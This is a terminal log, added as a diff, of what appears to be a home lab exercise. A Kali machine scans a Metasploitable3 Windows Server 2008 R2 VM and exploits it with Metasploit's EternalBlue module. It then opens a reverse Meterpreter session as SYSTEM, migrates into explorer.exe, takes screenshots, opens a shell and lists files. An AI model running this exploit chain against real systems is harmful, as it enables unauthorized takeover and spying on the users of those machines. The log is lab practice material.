@@ -1,0 +1,1643 @@
+┌──(kali㉿kali)-[~]
+└─$ ip config
+Object "config" is unknown, try "ip help".
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ip a     
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:5a:87:bc brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.4/24 brd 192.168.56.255 scope global dynamic noprefixroute eth0
+       valid_lft 443sec preferred_lft 443sec
+    inet6 fe80::f00:8a43:67fb:2711/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ping -c 4 192.168.56.3
+PING 192.168.56.3 (192.168.56.3) 56(84) bytes of data.
+64 bytes from 192.168.56.3: icmp_seq=1 ttl=128 time=1.88 ms
+64 bytes from 192.168.56.3: icmp_seq=2 ttl=128 time=2.77 ms
+64 bytes from 192.168.56.3: icmp_seq=3 ttl=128 time=0.977 ms
+64 bytes from 192.168.56.3: icmp_seq=4 ttl=128 time=1.93 ms
+
+--- 192.168.56.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 0.977/1.887/2.768/0.633 ms
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ nmap -Pn -p 445 192.168.56.3
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-14 15:09 -0400
+Nmap scan report for 192.168.56.3
+Host is up (0.0016s latency).
+
+PORT    STATE SERVICE
+445/tcp open  microsoft-ds
+MAC Address: 08:00:27:0A:6A:01 (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 0.19 seconds
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ping -c 4 192.168.56.3      
+PING 192.168.56.3 (192.168.56.3) 56(84) bytes of data.
+
+--- 192.168.56.3 ping statistics ---
+4 packets transmitted, 0 received, 100% packet loss, time 3069ms
+
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ping -c 4 192.168.56.3
+PING 192.168.56.3 (192.168.56.3) 56(84) bytes of data.
+64 bytes from 192.168.56.3: icmp_seq=1 ttl=128 time=2.97 ms
+64 bytes from 192.168.56.3: icmp_seq=2 ttl=128 time=2.48 ms
+64 bytes from 192.168.56.3: icmp_seq=3 ttl=128 time=1.55 ms
+64 bytes from 192.168.56.3: icmp_seq=4 ttl=128 time=1.20 ms
+
+--- 192.168.56.3 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 3005ms
+rtt min/avg/max/mdev = 1.198/2.048/2.973/0.709 ms
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ msfconcole
+msfconcole: command not found
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ msfconsole
+Metasploit tip: You can use help to view all available commands
+                                                  
+
+*Neutrino_Cannon*PrettyBeefy*PostalTime*binbash*deadastronauts*EvilBunnyWrote*L1T*Mail.ru*() { :;}; echo vulnerable*
+*Team sorceror*ADACTF*BisonSquad*socialdistancing*LeukeTeamNaam*OWASP Moncton*Alegori*exit*Vampire Bunnies*APT593*
+*QuePasaZombiesAndFriends*NetSecBG*coincoin*ShroomZ*Slow Coders*Scavenger Security*Bruh*NoTeamName*Terminal Cult*
+*edspiner*BFG*MagentaHats*0x01DA*Kaczuszki*AlphaPwners*FILAHA*Raffaela*HackSurYvette*outout*HackSouth*Corax*yeeb0iz*
+*SKUA*Cyber COBRA*flaghunters*0xCD*AI Generated*CSEC*p3nnm3d*IFS*CTF_Circle*InnotecLabs*baadf00d*BitSwitchers*0xnoobs*
+*ItPwns - Intergalactic Team of PWNers*PCCsquared*fr334aks*runCMD*0x194*Kapital Krakens*ReadyPlayer1337*Team 443*
+*H4CKSN0W*InfOUsec*CTF Community*DCZia*NiceWay*0xBlueSky*ME3*Tipi'Hack*Porg Pwn Platoon*Hackerty*hackstreetboys*
+*ideaengine007*eggcellent*H4x*cw167*localhorst*Original Cyan Lonkero*Sad_Pandas*FalseFlag*OurHeartBleedsOrange*SBWASP*
+*Cult of the Dead Turkey*doesthismatter*crayontheft*Cyber Mausoleum*scripterz*VetSec*norbot*Delta Squad Zero*Mukesh*
+*x00-x00*BlackCat*ARESx*cxp*vaporsec*purplehax*RedTeam@MTU*UsalamaTeam*vitamink*RISC*forkbomb444*hownowbrowncow*
+*etherknot*cheesebaguette*downgrade*FR!3ND5*badfirmware*Cut3Dr4g0n*dc615*nora*Polaris One*team*hail hydra*Takoyaki*
+*Sudo Society*incognito-flash*TheScientists*Tea Party*Reapers of Pwnage*OldBoys*M0ul3Fr1t1B13r3*bearswithsaws*DC540*
+*iMosuke*Infosec_zitro*CrackTheFlag*TheConquerors*Asur*4fun*Rogue-CTF*Cyber*TMHC*The_Pirhacks*btwIuseArch*MadDawgs*
+*HInc*The Pighty Mangolins*CCSF_RamSec*x4n0n*x0rc3r3rs*emehacr*Ph4n70m_R34p3r*humziq*Preeminence*UMGC*ByteBrigade*
+*TeamFastMark*Towson-Cyberkatz*meow*xrzhev*PA Hackers*Kuolema*Nakateam*L0g!c B0mb*NOVA-InfoSec*teamstyle*Panic*
+*B0NG0R3*                                                                                    *Les Cadets Rouges*buf*
+*Les Tontons Fl4gueurs*                                                                      *404 : Flag Not Found*
+*' UNION SELECT 'password*      _________                __                                  *OCD247*Sparkle Pony*                                        
+*burner_herz0g*                 \_   ___ \_____  _______/  |_ __ _________   ____            *Kill$hot*ConEmu*                                            
+*here_there_be_trolls*          /    \  \/\__  \ \____ \   __\  |  \_  __ \_/ __ \           *;echo"hacked"*                                              
+*r4t5_*6rung4nd4*NYUSEC*        \     \____/ __ \|  |_> >  | |  |  /|  | \/\  ___/           *karamel4e*                                                  
+*IkastenIO*TWC*balkansec*        \______  (____  /   __/|__| |____/ |__|    \___  >          *cybersecurity.li*                                           
+*TofuEelRoll*Trash Pandas*              \/     \/|__|                           \/           *OneManArmy*cyb3r_w1z4rd5*                                   
+*Astra*Got Schwartz?*tmux*                  ___________.__                                   *AreYouStuck*Mr.Robot.0*                                     
+*\nls*Juicy white peach*                    \__    ___/|  |__   ____                         *EPITA Rennes*                                               
+*HackerKnights*                               |    |   |  |  \_/ __ \                        *guildOfGengar*Titans*                                       
+*Pentest Rangers*                             |    |   |   Y  \  ___/                        *The Libbyrators*                                            
+*placeholder name*bitup*                      |____|   |___|  /\___  >                       *JeffTadashi*Mikeal*                                         
+*UCASers*onotch*                                            \/     \/                        *ky_dong_day_song*                                           
+*NeNiNuMmOk*                              ___________.__                                     *JustForFun!*                                                
+*Maux de tête*LalaNG*                     \_   _____/|  | _____     ____                     *g3tsh3Lls0on*                                               
+*crr0tz*z3r0p0rn*clueless*                 |    __)  |  | \__  \   / ___\                    *Phở Đặc Biệt*Paradox*                                       
+*HackWara*                                 |     \   |  |__/ __ \_/ /_/  >                   *KaRIPux*inf0sec*                                            
+*Kugelschreibertester*                     \___  /   |____(____  /\___  /                    *bluehens*Antoine77*                                         
+*icemasters*                                   \/              \//_____/                     *genxy*TRADE_NAMES*                                          
+*Spartan's Ravens*                       _______________   _______________                   *BadByte*fontwang_tw*                                        
+*g0ldd1gg3rs*pappo*                     \_____  \   _  \  \_____  \   _  \                   *ghoti*                                                      
+*Les CRACKS*c0dingRabbits*               /  ____/  /_\  \  /  ____/  /_\  \                  *LinuxRiders*                                                
+*2Cr4Sh*RecycleBin*                     /       \  \_/   \/       \  \_/   \                 *Jalan Durian*                                               
+*ExploitStudio*                         \_______ \_____  /\_______ \_____  /                 *WPICSC*logaritm*                                            
+*Car RamRod*0x41414141*                         \/     \/         \/     \/                  *Orv1ll3*team-fm4dd*                                         
+*Björkson*FlyingCircus*                                                                      *PwnHub*H4X0R*Yanee*
+*Securifera*hot cocoa*                                                                       *Et3rnal*PelarianCP*
+*n00bytes*DNC&G*guildzero*dorko*tv*42*{EHF}*CarpeDien*Flamin-Go*BarryWhite*XUcyber*FernetInjection*DCcurity*
+*Mars Explorer*ozen_cfw*Fat Boys*Simpatico*nzdjb*Isec-U.O*The Pomorians*T35H*H@wk33*JetJ*OrangeStar*Team Corgi*
+*D0g3*0itch*OffRes*LegionOfRinf*UniWA*wgucoo*Pr0ph3t*L0ner*_n00bz*OSINT Punchers*Tinfoil Hats*Hava*Team Neu*
+*Cyb3rDoctor*Techlock Inc*kinakomochi*DubbelDopper*bubbasnmp*w*Gh0st$*tyl3rsec*LUCKY_CLOVERS*ev4d3rx10-team*ir4n6*
+*PEQUI_ctf*HKLBGD*L3o*5 bits short of a byte*UCM*ByteForc3*Death_Geass*Stryk3r*WooT*Raise The Black*CTErr0r*
+*Individual*mikejam*Flag Predator*klandes*_no_Skids*SQ.*CyberOWL*Ironhearts*Kizzle*gauti*
+*San Antonio College Cyber Rangers*sam.ninja*Akerbeltz*cheeseroyale*Ephyra*sard city*OrderingChaos*Pickle_Ricks*
+*Hex2Text*defiant*hefter*Flaggermeister*Oxford Brookes University*OD1E*noob_noob*Ferris Wheel*Ficus*ONO*jameless*
+*Log1c_b0mb*dr4k0t4*0th3rs*dcua*cccchhhh6819*Manzara's Magpies*pwn4lyfe*Droogy*Shrubhound Gang*ssociety*HackJWU*
+*asdfghjkl*n00bi3*i-cube warriors*WhateverThrone*Salvat0re*Chadsec*0x1337deadbeef*StarchThingIDK*Tieto_alaviiva_turva*
+*InspiV*RPCA Cyber Club*kurage0verfl0w*lammm*pelicans_for_freedom*switchteam*tim*departedcomputerchairs*cool_runnings*
+*chads*SecureShell*EetIetsHekken*CyberSquad*P&K*Trident*RedSeer*SOMA*EVM*BUckys_Angels*OrangeJuice*DemDirtyUserz*
+*OpenToAll*Born2Hack*Bigglesworth*NIS*10Monkeys1Keyboard*TNGCrew*Cla55N0tF0und*exploits33kr*root_rulzz*InfosecIITG*
+*superusers*H@rdT0R3m3b3r*operators*NULL*stuxCTF*mHackresciallo*Eclipse*Gingabeast*Hamad*Immortals*arasan*MouseTrap*
+*damn_sadboi*tadaaa*null2root*HowestCSP*fezfezf*LordVader*Fl@g_Hunt3rs*bluenet*P@Ge2mE*
+
+
+
+       =[ metasploit v6.4.135-dev                               ]
++ -- --=[ 2,654 exploits - 1,338 auxiliary - 2,141 payloads     ]
++ -- --=[ 433 post - 49 encoders - 14 nops - 12 evasion         ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+The Metasploit Framework is a Rapid7 Open Source Project
+
+msf > use exploit/windows/smb/ms17_010_eternalblue
+[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
+msf exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 192.168.56.3
+RHOSTS => 192.168.56.3
+msf exploit(windows/smb/ms17_010_eternalblue) > set LHOST 192.168.56.4
+LHOST => 192.168.56.4
+msf exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4444
+LPORT => 4444
+msf exploit(windows/smb/ms17_010_eternalblue) > show options
+
+Module options (exploit/windows/smb/ms17_010_eternalblue):
+
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   RHOSTS         192.168.56.3     yes       The target host(s), see https:
+                                             //docs.metasploit.com/docs/usi
+                                             ng-metasploit/basics/using-met
+                                             asploit.html
+   RPORT          445              yes       The target port (TCP)
+   SMBDomain                       no        (Optional) The Windows domain
+                                             to use for authentication. Onl
+                                             y affects Windows Server 2008
+                                             R2, Windows 7, Windows Embedde
+                                             d Standard 7 target machines.
+   SMBPass                         no        (Optional) The password for th
+                                             e specified username
+   SMBUser                         no        (Optional) The username to aut
+                                             henticate as
+   VERIFY_ARCH    true             yes       Check if remote architecture m
+                                             atches exploit Target. Only af
+                                             fects Windows Server 2008 R2,
+                                             Windows 7, Windows Embedded St
+                                             andard 7 target machines.
+   VERIFY_TARGET  true             yes       Check if remote OS matches exp
+                                             loit Target. Only affects Wind
+                                             ows Server 2008 R2, Windows 7,
+                                              Windows Embedded Standard 7 t
+                                             arget machines.
+
+
+Payload options (windows/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh,
+                                        thread, process, none)
+   LHOST     192.168.56.4     yes       The listen address (an interface ma
+                                        y be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 192.168.56.4:4444 
+[*] 192.168.56.3:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.56.3:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
+/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.29/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
+[*] 192.168.56.3:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.56.3:445 - The target is vulnerable.
+[*] 192.168.56.3:445 - Connecting to target for exploitation.
+[+] 192.168.56.3:445 - Connection established for exploitation.
+[+] 192.168.56.3:445 - Target OS selected valid for OS indicated by SMB reply
+[*] 192.168.56.3:445 - CORE raw buffer dump (51 bytes)
+[*] 192.168.56.3:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
+[*] 192.168.56.3:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
+[*] 192.168.56.3:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
+[*] 192.168.56.3:445 - 0x00000030  6b 20 31                                         k 1             
+[+] 192.168.56.3:445 - Target arch selected valid for arch indicated by DCE/RPC reply
+[*] 192.168.56.3:445 - Trying exploit with 12 Groom Allocations.
+[*] 192.168.56.3:445 - Sending all but last fragment of exploit packet
+[*] 192.168.56.3:445 - Starting non-paged pool grooming
+[+] 192.168.56.3:445 - Sending SMBv2 buffers
+[+] 192.168.56.3:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
+[*] 192.168.56.3:445 - Sending final SMBv2 buffers.
+[*] 192.168.56.3:445 - Sending last fragment of exploit packet!
+[*] 192.168.56.3:445 - Receiving response from exploit packet
+[+] 192.168.56.3:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
+[*] 192.168.56.3:445 - Sending egg to corrupted connection.
+[*] 192.168.56.3:445 - Triggering free of corrupted buffer.
+[*] Sending stage (248902 bytes) to 192.168.56.3
+[+] 192.168.56.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.56.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[+] 192.168.56.3:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
+[*] Meterpreter session 1 opened (192.168.56.4:4444 -> 192.168.56.3:49289) at 2026-08-14 15:32:32 -0400
+
+meterpreter > sessions -l
+Usage: sessions [options] or sessions [id]
+
+Interact with a different session ID.
+
+OPTIONS:
+
+    -h, --help           Show this message
+    -i, --interact <id>  Interact with a provided session ID
+
+meterpreter > sysinfo
+Computer        : METASPLOITABLE3
+OS              : Windows Server 2008 R2 (6.1 Build 7601, Service Pack 1).
+Architecture    : x64
+gSystem Language : en_US
+etDomain          : WORKGROUP
+uiLogged On Users : 1
+dMeterpreter     : x64/windows
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+meterpreter > ps
+
+Process List
+============
+
+ PID   PPID  Name        Arch  Session  User              Path
+ ---   ----  ----        ----  -------  ----              ----
+ 0     0     [System Pr
+             ocess]
+ 4     0     System      x64   0
+ 12    1928  dcserverht  x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+             tpd.exe                    AL SERVICE        esktopCentral_Ser
+                                                          ver\apache\bin\dc
+                                                          serverhttpd.exe
+ 252   4     smss.exe    x64   0        NT AUTHORITY\SYS  \SystemRoot\Syste
+                                        TEM               m32\smss.exe
+ 284   464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 328   316   csrss.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\csrss.exe
+ 368   316   wininit.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             e                          TEM               32\wininit.exe
+ 376   360   csrss.exe   x64   1        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\csrss.exe
+ 404   360   winlogon.e  x64   1        NT AUTHORITY\SYS  C:\Windows\system
+             xe                         TEM               32\winlogon.exe
+ 464   368   services.e  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             xe                         TEM               32\services.exe
+ 472   368   lsass.exe   x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\lsass.exe
+ 480   368   lsm.exe     x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\lsm.exe
+ 592   464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 656   464   VBoxServic  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+             e.exe                      TEM               32\VBoxService.ex
+                                                          e
+ 720   464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 812   464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 836   5064  VBoxTray.e  x64   1        METASPLOITABLE3\  C:\Windows\System
+             xe                         vagrant           32\VBoxTray.exe
+ 864   464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 920   464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 960   464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 980   464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 1080  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1124  464   spoolsv.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\System
+             e                          TEM               32\spoolsv.exe
+ 1156  5064  DesktopCen  x86   1        METASPLOITABLE3\  C:\ManageEngine\D
+             tral.exe                   vagrant           esktopCentral_Ser
+                                                          ver\bin\DesktopCe
+                                                          ntral.exe
+ 1172  464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 1192  464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 1196  464   wrapper.ex  x86   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 1280  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1288  464   domain1Ser  x64   0        NT AUTHORITY\LOC
+             vice.exe                   AL SERVICE
+ 1376  464   elasticsea  x64   0        NT AUTHORITY\SYS  C:\Program Files\
+             rch-servic                 TEM               elasticsearch-1.1
+             e-x64.exe                                    .1\bin\elasticsea
+                                                          rch-service-x64.e
+                                                          xe
+ 1384  328   conhost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             e                          TEM               32\conhost.exe
+ 1388  1928  dcrotatelo  x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+             gs.exe                     AL SERVICE        esktopCentral_Ser
+                                                          ver\apache\bin\dc
+                                                          rotatelogs.exe
+ 1416  464   svchost.ex  x64   0        NT AUTHORITY\SYS
+             e                          TEM
+ 1440  464   jenkins.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 1488  1288  cmd.exe     x64   0        NT AUTHORITY\LOC  C:\Windows\system
+                                        AL SERVICE        32\cmd.exe
+ 1496  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1500  464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 1540  1196  java.exe    x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+                                        AL SERVICE        esktopCentral_Ser
+                                                          ver\jre\bin\java.
+                                                          exe
+ 1548  1488  java.exe    x64   0        NT AUTHORITY\LOC  C:\Program Files
+                                        AL SERVICE        (x86)\Common File
+                                                          s\Oracle\Java\jav
+                                                          apath\java.exe
+ 1652  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1788  464   jmx.exe     x64   0        NT AUTHORITY\LOC
+                                        AL SERVICE
+ 1808  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 1880  464   dcnotifica  x86   0        NT AUTHORITY\LOC
+             tionserver                 AL SERVICE
+             .exe
+ 1928  464   dcserverht  x86   0        NT AUTHORITY\LOC
+             tpd.exe                    AL SERVICE
+ 1952  464   snmp.exe    x64   0        NT AUTHORITY\SYS
+                                        TEM
+ 2084  1548  java.exe    x64   0        NT AUTHORITY\LOC  C:\Program Files\
+                                        AL SERVICE        Java\jdk1.8.0_211
+                                                          \bin\java.exe
+ 2124  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 2208  464   httpd.exe   x64   0        NT AUTHORITY\LOC
+                                        AL SERVICE
+ 2316  12    dcrotatelo  x86   0        NT AUTHORITY\LOC  C:\ManageEngine\D
+             gs.exe                     AL SERVICE        esktopCentral_Ser
+                                                          ver\apache\bin\dc
+                                                          rotatelogs.exe
+ 2332  328   conhost.ex  x64   0        NT AUTHORITY\LOC  C:\Windows\system
+             e                          AL SERVICE        32\conhost.exe
+ 3108  464   mysqld.exe  x64   0        NT AUTHORITY\SYS  c:\wamp\bin\mysql
+                                        TEM               \mysql5.5.20\bin\
+                                                          mysqld.exe
+ 3148  464   svchost.ex  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             e                          TEM               32\svchost.exe
+ 3156  1440  java.exe    x64   0        NT AUTHORITY\LOC  C:\Program Files
+                                        AL SERVICE        (x86)\Common File
+                                                          s\Oracle\Java\jav
+                                                          apath\java.exe
+ 3172  1788  cmd.exe     x64   0        NT AUTHORITY\LOC  C:\Windows\system
+                                        AL SERVICE        32\cmd.exe
+ 3196  464   wlms.exe    x64   0        NT AUTHORITY\SYS  C:\Windows\system
+                                        TEM               32\wlms\wlms.exe
+ 3216  3172  java.exe    x64   0        NT AUTHORITY\LOC  C:\openjdk6\openj
+                                        AL SERVICE        dk-1.6.0-unoffici
+                                                          al-b27-windows-am
+                                                          d64\jre\bin\java.
+                                                          exe
+ 3308  592   WmiPrvSE.e  x64   0        NT AUTHORITY\SYS  C:\Windows\system
+             xe                         TEM               32\wbem\wmiprvse.
+                                                          exe
+ 3576  2208  httpd.exe   x64   0        NT AUTHORITY\LOC  C:\wamp\bin\apach
+                                        AL SERVICE        e\apache2.2.21\bi
+                                                          n\httpd.exe
+ 3948  464   sppsvc.exe  x64   0        NT AUTHORITY\NET
+                                        WORK SERVICE
+ 4060  464   svchost.ex  x64   0        NT AUTHORITY\NET
+             e                          WORK SERVICE
+ 4148  464   msdtc.exe   x64   0        NT AUTHORITY\NET
+                                        WORK SERVICE
+ 4496  464   taskhost.e  x64   1        METASPLOITABLE3\  C:\Windows\system
+             xe                         vagrant           32\taskhost.exe
+ 4776  464   svchost.ex  x64   0        NT AUTHORITY\LOC
+             e                          AL SERVICE
+ 4980  980   dwm.exe     x64   1        METASPLOITABLE3\  C:\Windows\system
+                                        vagrant           32\Dwm.exe
+ 5064  4420  explorer.e  x64   1        METASPLOITABLE3\  C:\Windows\Explor
+             xe                         vagrant           er.EXE
+
+meterpreter > migrate 5064
+[*] Migrating from 1124 to 5064...
+[*] Migration completed successfully.
+meterpreter > getpid
+Current pid: 5064
+meterpreter > getuid
+Server username: METASPLOITABLE3\vagrant
+meterpreter > getdesktop
+Session 1\WinSta0\Default
+meterpreter > screenshot
+Screenshot saved to: /home/kali/GflMlTlP.jpeg
+meterpreter > screenshot
+Screenshot saved to: /home/kali/oGBscBlm.jpeg
+meterpreter > screenshot
+Screenshot saved to: /home/kali/rgUZJmtW.jpeg
+meterpreter > shell
+Process 572 created.
+Channel 1 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+metasploitable3\vagrant
+
+C:\Windows\system32>start "" notepad.exe
+start "" notepad.exe
+
+C:\Windows\system32>exit
+exit
+
+
+^C
+Terminate channel 1? [y/N]  n
+^C  
+Terminate channel 1? [y/N]  y
+meterpreter > getpid
+Current pid: 5064
+meterpreter > getuid
+Server username: METASPLOITABLE3\vagrant
+meterpreter > getdesktop
+Session 1\WinSta0\Default
+meterpreter > screenshot
+Screenshot saved to: /home/kali/oATmCIbl.jpeg
+meterpreter > shell
+Process 1128 created.
+Channel 2 created.
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+metasploitable3\vagrant
+
+C:\Windows\system32>hostname
+hostname
+metasploitable3-win2k8
+
+C:\Windows\system32>ipconfig
+ipconfig
+
+Windows IP Configuration
+
+
+Ethernet adapter Local Area Connection 2:
+
+   Connection-specific DNS Suffix  . : 
+   Link-local IPv6 Address . . . . . : fe80::3d69:66b0:d141:cea5%14
+   IPv4 Address. . . . . . . . . . . : 192.168.56.3
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : 
+
+Ethernet adapter Local Area Connection:
+
+   Connection-specific DNS Suffix  . : 
+   IPv6 Address. . . . . . . . . . . : fd17:625c:f037:2:fd63:83a2:85e3:4729
+   Link-local IPv6 Address . . . . . : fe80::fd63:83a2:85e3:4729%11
+   IPv4 Address. . . . . . . . . . . : 10.0.2.15
+   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+   Default Gateway . . . . . . . . . : fe80::2%11
+                                       10.0.2.2
+
+Tunnel adapter isatap.{88E22A3B-E94F-466A-B3CE-2A94D227957E}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+Tunnel adapter isatap.{6FEEDED4-FC1E-4857-BEB8-72167D5BDAA6}:
+
+   Media State . . . . . . . . . . . : Media disconnected
+   Connection-specific DNS Suffix  . : 
+
+C:\Windows\system32>dir
+dir
+ Volume in drive C is Windows 2008R2
+ Volume Serial Number is 00C2-527F
+
+ Directory of C:\Windows\system32
+
+08/14/2026  12:31 PM    <DIR>          .
+08/14/2026  12:31 PM    <DIR>          ..
+03/19/2023  02:05 AM    <DIR>          -p
+11/20/2010  10:56 PM    <DIR>          0409
+11/20/2010  08:24 PM           158,720 aaclient.dll
+11/20/2010  08:24 PM         3,745,792 accessibilitycpl.dll
+06/10/2009  02:00 PM            14,032 accserv.mib
+07/13/2009  06:24 PM            39,424 ACCTRES.dll
+07/13/2009  06:40 PM             9,216 acledit.dll
+07/13/2009  06:40 PM           154,112 aclui.dll
+11/20/2010  08:24 PM            53,248 acppage.dll
+07/13/2009  06:40 PM            11,264 acproxy.dll
+11/20/2010  08:25 PM           780,800 ActionCenter.dll
+11/20/2010  08:25 PM           549,888 ActionCenterCPL.dll
+11/20/2010  08:24 PM           213,504 ActionQueue.dll
+07/13/2009  06:40 PM           267,776 activeds.dll
+07/13/2009  04:53 PM           111,616 activeds.tlb
+11/20/2010  08:24 PM           111,616 ActiveSockets.dll
+11/20/2010  08:24 PM           958,464 actxprxy.dll
+07/13/2009  06:38 PM            40,448 AdapterTroubleshooter.exe
+07/13/2009  06:40 PM            90,112 admparse.dll
+11/20/2010  08:24 PM           577,024 AdmTmpl.dll
+07/13/2009  06:40 PM            55,296 admwprox.dll
+07/13/2009  06:40 PM            56,832 adprovider.dll
+07/13/2009  06:40 PM           239,104 adsldp.dll
+07/13/2009  06:40 PM           236,544 adsldpc.dll
+07/13/2009  06:40 PM           108,032 adsmsext.dll
+07/13/2009  06:40 PM           326,144 adsnt.dll
+02/02/2015  08:28 PM           686,080 adtschema.dll
+11/20/2010  08:32 PM    <DIR>          AdvancedInstallers
+07/13/2009  06:40 PM           877,056 advapi32.dll
+07/13/2009  06:40 PM           160,256 advpack.dll
+07/13/2009  06:40 PM             8,704 aecache.dll
+07/13/2009  06:24 PM            23,040 aeevts.dll
+11/20/2010  08:24 PM           424,448 aeinv.dll
+07/13/2009  06:40 PM            72,192 aelupsvc.dll
+11/20/2010  08:24 PM           412,160 aepdu.dll
+07/13/2009  06:40 PM            59,904 aepic.dll
+07/13/2009  06:40 PM            60,928 ahadmin.dll
+11/20/2010  08:24 PM           122,880 aitagent.exe
+07/13/2009  06:38 PM            79,360 alg.exe
+11/20/2010  08:24 PM            89,088 amstream.dll
+07/13/2009  06:40 PM            25,600 amxread.dll
+07/13/2009  06:40 PM         2,134,528 apds.dll
+07/13/2009  06:40 PM            17,920 apilogen.dll
+07/13/2009  06:40 PM           273,920 apircl.dll
+02/02/2015  08:28 PM             6,656 apisetschema.dll
+11/20/2010  08:24 PM           342,016 apphelp.dll
